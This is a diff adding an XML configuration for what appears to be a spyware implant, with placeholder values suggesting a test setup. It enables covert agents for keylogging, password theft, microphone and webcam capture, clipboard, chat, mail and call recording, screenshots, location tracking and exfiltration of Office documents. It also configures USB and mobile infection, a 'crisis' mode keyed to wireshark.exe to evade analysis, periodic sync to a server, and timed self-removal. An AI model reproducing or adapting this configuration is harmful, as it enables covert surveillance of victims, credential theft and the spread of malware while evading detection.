@@ -1,0 +1,171 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+  <events>
+    <event action="0" actiondesc="">
+      <process window="false" focus="false" endaction="-1" endactiondesc="">notepad.exe</process>
+    </event>
+    <event action="1" actiondesc="">
+      <process window="false" focus="false" endaction="-1" endactiondesc="">calc.exe</process>
+    </event>
+    <event action="0" actiondesc="Sync">
+      <timer type="loop" endaction="-1" endactiondesc="">
+        <day>0</day>
+        <hour>0</hour>
+        <minute>1</minute>
+        <second>0</second>
+      </timer>
+    </event>
+    <event action="2" actiondesc="Stop Agents">
+      <screensaver endaction="3" endactiondesc="Start Agents"/>
+    </event>
+    <event action="0" actiondesc="Sync">
+      <connection ip="0.0.0.0" netmask="255.255.255.255" port="0"/>
+    </event>
+    <event action="2" actiondesc="Stop Agents">
+      <quota size="200" endaction="3" endactiondesc="Start Agents"/>
+    </event>
+    <event action="1" actiondesc="Destroy Me !">
+      <winevent id="666" source=""/>
+    </event>
+    <event action="0" actiondesc="Sync">
+      <timer type="daily" endaction="-1" endactiondesc="NONE">
+        <day>0</day>
+        <hour>15</hour>
+        <minute>0</minute>
+        <second>0</second>
+        <endhour>16</endhour>
+        <endminute>0</endminute>
+        <endsecond>0</endsecond>
+      </timer>
+    </event>
+    <event action="1" actiondesc="Destroy Me !">
+      <timer type="date" endaction="-1" endactiondesc="">2011-05-26 00:00:00</timer>
+    </event>
+    <event action="0" actiondesc="Sync">
+      <timer type="after startup" endaction="-1" endactiondesc="">
+        <day>0</day>
+        <hour>0</hour>
+        <minute>10</minute>
+        <second>0</second>
+      </timer>
+    </event>
+    <event action="1" actiondesc="Destroy Me !">
+      <timer type="after install" endaction="-1" endactiondesc="">
+        <day>100</day>
+        <hour>0</hour>
+        <minute>0</minute>
+        <second>0</second>
+      </timer>
+    </event>
+  </events>
+  <actions>
+    <action number="0" description="Sync">
+      <synchronize host="syncserver" bandwidth="1000" mindelay="0" maxdelay="0"/>
+    </action>
+    <action number="1" description="Destroy Me !">
+      <uninstall/>
+    </action>
+    <action number="2" description="Stop Agents">
+      <agent action="stop" name="mic"/>
+      <agent action="stop" name="camera"/>
+    </action>
+    <action number="3" description="Start Agents">
+      <agent action="start" name="mic"/>
+      <agent action="start" name="camera"/>
+    </action>
+    <action number="4" description="Log">
+      <log>Testing...</log>
+    </action>
+    <action number="5" description="Command">
+      <execute>cmd.exe /c dir</execute>
+    </action>
+    <action number="6" description="MIXED">
+      <agent action="stop" name="application"/>
+      <execute>aasd</execute>
+      <log>qwerty</log>
+    </action>
+  </actions>
+  <agents>
+    <agent enabled="true">
+      <application/>
+    </agent>
+    <agent enabled="true">
+      <call buffer="512" compression="5"/>
+    </agent>
+    <agent enabled="true">
+      <camera interval="15" iterations="50"/>
+    </agent>
+    <agent enabled="true">
+      <chat/>
+    </agent>
+    <agent enabled="true">
+      <clipboard/>
+    </agent>
+    <agent enabled="true">
+      <crisis>
+        <network enabled="true">
+          <process>wireshark.exe</process>
+        </network>
+        <hook enabled="true">
+          <process>sargui.exe</process>
+        </hook>
+      </crisis>
+    </agent>
+    <agent enabled="true">
+      <device applicationlist="true"/>
+    </agent>
+    <agent enabled="true">
+      <file open="true" capture="true" minsize="1" maxsize="500000" date="2010-01-04 14:49:58">
+        <accept>
+          <mask>*.doc</mask>
+          <mask>*.xls</mask>
+        </accept>
+        <deny>
+          <mask>*.tmp</mask>
+        </deny>
+      </file>
+    </agent>
+    <agent enabled="true">
+      <infection local="true" usb="true" mobile="214"/>
+    </agent>
+    <agent enabled="true">
+      <keylog/>
+    </agent>
+    <agent enabled="true">
+      <messages>
+        <mail enabled="true">
+          <filter history="true" maxsize="30" datefrom="2010-01-04 14:49:58" dateto="2011-05-31 00:00:00"/>
+        </mail>
+      </messages>
+    </agent>
+    <agent enabled="true">
+      <mic autosense="false" silence="5" threshold="0.22" vad="false" vadthreshold="50"/>
+    </agent>
+    <agent enabled="true">
+      <mouse width="40" height="40"/>
+    </agent>
+    <agent enabled="true">
+      <organizer/>
+    </agent>
+    <agent enabled="true">
+      <password/>
+    </agent>
+    <agent enabled="true">
+      <position interval="300" gps="false" cell="false" wifi="true"/>
+    </agent>
+    <agent enabled="true">
+      <print scale="4"/>
+    </agent>
+    <agent enabled="true">
+      <snapshot interval="30" newwindow="true" onlywindow="false"/>
+    </agent>
+    <agent enabled="true">
+      <url snapshot="false"/>
+    </agent>
+  </agents>
+  <globals>
+    <quota mindisk="100" maxlog="100" wipe="false"/>
+    <nohide/>
+    <template type="DESKTOP"/>
+  </globals>
+</configuration>
